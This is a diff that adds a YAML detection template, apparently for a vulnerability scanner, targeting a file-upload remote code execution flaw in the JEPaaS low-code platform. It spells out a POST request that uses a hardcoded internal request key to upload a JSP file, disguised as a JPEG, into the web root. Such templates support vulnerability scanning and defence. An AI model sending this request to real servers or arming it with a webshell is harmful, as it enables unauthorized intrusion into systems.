@@ -1,0 +1,30 @@
+id:
+info:
+  name: JEPaaS低代码平台file文件上传致RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /je/document/file?bucket=webroot
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
+    internalRequestKey: schedule_898901212
+    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+    Connection: close
+  data: |
+    ------21909179191068471382830692394
+    Content-Disposition: form-data; name="files"; filename="test.jsp"
+    Content-Type: image/jpeg
+  
+    123456
+    ------21909179191068471382830692394--
+response1:
+  headers:
+  body: true
+  code: 200
+requests2:
+response2:
